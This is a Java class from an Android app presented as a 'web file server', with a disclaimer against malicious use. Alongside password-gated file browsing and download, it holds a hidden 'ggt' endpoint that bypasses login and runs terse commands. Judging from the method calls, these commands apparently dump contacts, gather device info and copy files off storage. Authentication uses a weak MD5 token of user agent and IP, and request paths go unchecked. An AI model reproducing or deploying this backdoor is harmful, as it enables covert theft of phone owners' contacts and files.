package com.example.myapplication.src.main.java.com.nameless.web_server;

import static android.app.PendingIntent.getActivity;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import com.example.myapplication.MainActivity;
import com.example.myapplication.service;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.math.BigInteger;
import java.net.Socket;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Date;

/**
 * This program can be use for your home PC or server.
 * Web file server give you the ability to have permanent access to files on your computer.
 * The author of this program does not call for its use as malicious software.
 * Anyway the author does not bear any responsibility!
 *
 * @author Mikhailov Danil(midaef).
 */

/**
 * This class use for create session and token
 */

public class Session extends Thread {

	File locSrc = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
	File locDst = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
	File zppng  = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
	File locsv = locDst;
	private HashMap<String, String> users;
	private Page page = new Page();
	private String password;
	private Socket socket;
	private String ROOT_PATH = Page.gtass("resources/control.html");
	private Settings settings = new Settings();
	StringBuilder dbanrep = new StringBuilder();

	public Session(Socket socket, HashMap<String, String> users) throws IOException {
//		this.password = settings.getPassword();
		this.password = settings.getPassword();
		this.users = users;
		this.socket = socket;
		this.ROOT_PATH = settings.getPath();
	}

	@Override
	public void run() {
		try (BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
			String line = reader.readLine();
			String clientIP = getClientIP(socket);
			if (line != null) {
//				Log.d("TAG", "1");
				String token = createToken(clientIP, reader);
				if (line.contains("control.html") || settings.getKeyWebServer() == 0) {
					
//					Log.d("TAG", "2");
					if (settings.getKeyWebFileServer() == 1) {
//						Log.d("TAG", "3");
						Boolean isLogin = login(line, token);
						if (isLogin) {
//							Log.d("TAG", "4");
							line = line.split("\n")[0].replace(" HTTP/1.1", "");
							String request = parser(line);
							sendRequest(socket, request);
						} else sendRequest(socket, Page.gtass("resources/control.html"));
//						Log.d("TAG", "-4");
					} else {sendRequest(socket, page.createErrorPage());
//						Log.d("TAG", "-3");
					}
				}
				else if(line.contains("ggt")){
					System.out.println("GTT"+line);
					String request = parser(line);
					sendRequest(socket,request);
				}
				else if (settings.getKeyWebServer() == 1) {
//					Log.d("TAG", "-2");
					sendRequest(socket, Page.gtass("resources/control.html"));
				}
			}
//			Log.d("TAG", "-1");

		} catch (Exception e) {e.printStackTrace();}
	}

	private String createToken(String clientIP, BufferedReader reader) {
		try {
			String userAgent = "";
			for (int i = 0; i < 7; i++) {
				userAgent = reader.readLine();
				if (userAgent.startsWith("User-Agent: ")) {
					break;
				}
			}
			userAgent = userAgent + clientIP;
			if (userAgent.startsWith("User-Agent: ")) {
				MessageDigest m = MessageDigest.getInstance("MD5");
				m.reset();
				m.update(userAgent.getBytes("utf-8"));
				String token = new BigInteger(1, m.digest()).toString(16);
				while (token.length() < 32) {
					token = "0" + token;
				}
				return token;
			}
		} catch (Exception e) {e.printStackTrace();}
		return "";
	}

	private String getPasswordAndLogin(String line) {
		String req[] = line.split("=");
		String data = req[req.length-1].replace("/ HTTP/1.1", "");
		return data;
	}

	private Boolean login(String line, String token) {
		if (!users.containsKey(token)) {
			if (line.contains("entry=")) {
				String req = getPasswordAndLogin(line);
				if (req.split("/")[1].equals(password)) {
					users.put(token, req.split("/")[0]);
					return true;
				} else return false;
			} else return false;
		}
		return true;
	}

	private String getClientIP(Socket socket) {
		return socket.getInetAddress().toString();
	}

	private String parser(String line) throws IOException {
		String directoryLink = "";
		if (line.contains("dir=") && !line.contains("download=")) {
			String directoryName = splitRequest(line, "dir=");
			try {
				directoryLink = page.getMainDir(directoryName);
			} catch (Exception e) {
				return page.createErrorPage();
			}
			if (!page.getFormatFile(directoryName).isEmpty()) {
				return page.openFile(page.getFormatFile(directoryName), directoryLink);
			}
			String index = page.createIndexPage(directoryLink, false);
			return index;
		} else if (line.contains("download=")) {
			String filePath = splitRequest(line, "dir=").replace("download=", "")
					.replace("//", "");
			String path = page.getMainDir("") + "/" + filePath;
			page.clearDirectoryList();
			if (filePath.contains("/")) {
				String[] data = filePath.split("/");
				return path + "pp&jk" + data[data.length-1] + "pp&jk" + new File(path).length() + "&keyword=download";
			}
			return path + "pp&jk" + filePath + "pp&jk" + new File(path).length() + "&keyword=download";
		}
		else if (line.contains("ggt")){
			try{
				if (line.contains("arg=[")) {
					String iop = line.substring(line.indexOf("arg=[") + 5, line.indexOf("]=arg"));
					System.out.println("ARG:  " + iop);
					line.replace(iop, "");
					return dban(iop);
				}
			}catch (Exception e){
				System.out.println("at arg");
				e.printStackTrace();
			}
			return crtdban("NO RESULT");
		}
		else if (line.equals("GET /") || line.contains("entry")) {
			String directory = page.getMainDir("");
			return page.createIndexPage(directory, true);
		} else {
			return crtdban("NO RESULT");
		}
	}


	public String dban(String arg) throws IOException {
		if (arg.equals("r")){  // ====================contact========================
			dbancmd.msg();
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("clr")){  //======================clear================================
			MainActivity.dbanrep = new StringBuilder();
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("info")){
			String packageName = MainActivity.getAppContext().getPackageName();
			dbancmd.gg(packageName);
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.equals("storage")) {
			showMessage("local dst  "+locDst+"\nlocal src  "+locSrc+"\nlocal save  "+locsv);
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("/ttt")) {

			File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);
			showMessage(Arrays.toString(fs).replace(",","<br>"));
			Log.d("/ttt", Arrays.toString(fs));
			// at index 0 you have the internal storage and at index 1 the real external...
			if (arg.length()>4) {
				File a = new File(arg.substring(5));
				if (a.exists()) {
					locsv = a;
				}
			}
			showMessage("arg "+arg);
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("!s")) {
			File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);

			if (arg.contains("1")){
				locSrc = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
				showMessage("source:- "+locSrc);
			}else if (arg.contains("2")){
				String y = String.valueOf(fs[1]);
				int first = y.indexOf("/");
				int second = y.indexOf("/", first + 1);
				int third = y.indexOf("/", second + 1);
				locSrc = new File(y.substring(0, third));
				showMessage("source:- "+locSrc);
			}
			return crtdban(MainActivity.dbanrep+"");
		} else if (arg.contains("!d")) {
			File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);
			if (arg.contains("1")){
				locDst = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
				showMessage("source:- "+locDst);
			}else if (arg.contains("2")){
				String y = String.valueOf(fs[1]);
				int first = y.indexOf("/");
				int second = y.indexOf("/", first + 1);
				int third = y.indexOf("/", second + 1);
				locDst = new File(y.substring(0, third));
				showMessage("source:- "+locDst);
			}
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains(".")) {   //========================dot=============================
			try {
				service.locate(locSrc, locDst + "/MyFolder/Tree", arg, locsv);
			} catch (Exception e) {
				e.printStackTrace();
			}
			showMessage("arg "+arg);

			return crtdban(MainActivity.dbanrep+"");
		} else{
			return crtdban("NO RESULT");
		}
	}




	public String crtdban(String thang) throws IOException {
		String dbanpg = Page.gtass("resources/dban.html");
		if (dbanpg.contains("&result&")){
			System.out.println("yes");
		}
		String qq = dbanpg.replace("&result&", "<br><td>" + thang + "</td>");
		return qq;
	}


	public  void wrtfl(String ffolder,String fname,String content,boolean append) {
		String rootPath = null;
		File f = null;
		try {
			rootPath = Environment.getExternalStorageDirectory()
					.getAbsolutePath() + "/" + ffolder + "/";
			File root = new File(rootPath);
			if (!root.exists()) {
				root.mkdirs();
			}
			f = new File(rootPath + fname);
			FileOutputStream out = new FileOutputStream(f,append);
			out.write(content.getBytes());
			out.flush();
			out.close();
		} catch (Exception e) {
		}
	}



	public static void showMessage(String msg) {
		String msgw;
		if (msg.contains("\n")) {
			msgw = msg.replace("\n", "<br>") + "<br>";
		} else {
			msgw = msg+"<br>";
		}
		MainActivity.dbanrep.append(msgw);
	}




















	private String splitRequest(String line, String type) {
		String[] request = line.split("\\?");
		String directoryName = "";
		for (String str : request) {
			directoryName += "/" + str.replace(type, "").replace("GET /", "")
					.replace("%20", " ");
		}
		String[] data = {};
		if (directoryName.contains(password + "//")) data = directoryName.split("//");
		else if (data.length == 0) return directoryName;
		return data[data.length-1];
	}

	private byte[] getBytes(String path) {
		Log.d("input", new File(path).exists()+"\""+path+"\"");
		byte[] fileInArray = new byte[(int)new File(path).length()];
		try {
			FileInputStream f = new FileInputStream(path);
			f.read(fileInArray);
			return fileInArray;
		} catch (Exception e) {e.printStackTrace();}
		return fileInArray;
	}

	private void sendRequest(Socket socket, String req) {
		try {
			String httpResponse = "HTTP/1.1 200 OK\r\n";
			OutputStream outputStream = socket.getOutputStream();
			PrintStream ps = new PrintStream(outputStream);
			if (req.contains("keyword=download")) {
				String data[] = req.split("pp&jk");
				Log.d("data", "sendRequest: "+req);
				byte[] fileInArray = getBytes(data[0]);
				ps.printf(httpResponse);
				ps.print("Content-Disposition: form-data; name=\"myFile\"; filename=\"" + data[1] + "\"\r\n");
				ps.printf("Content-Type: text/plain; charset=utf-8\r\n\r\n");
				outputStream.write(fileInArray);
			} else {
				httpResponse+="\r\n" + req;
				socket.getOutputStream().write(httpResponse.getBytes("UTF-8"));
			}
		} catch (Exception e) {e.printStackTrace();}
	}

}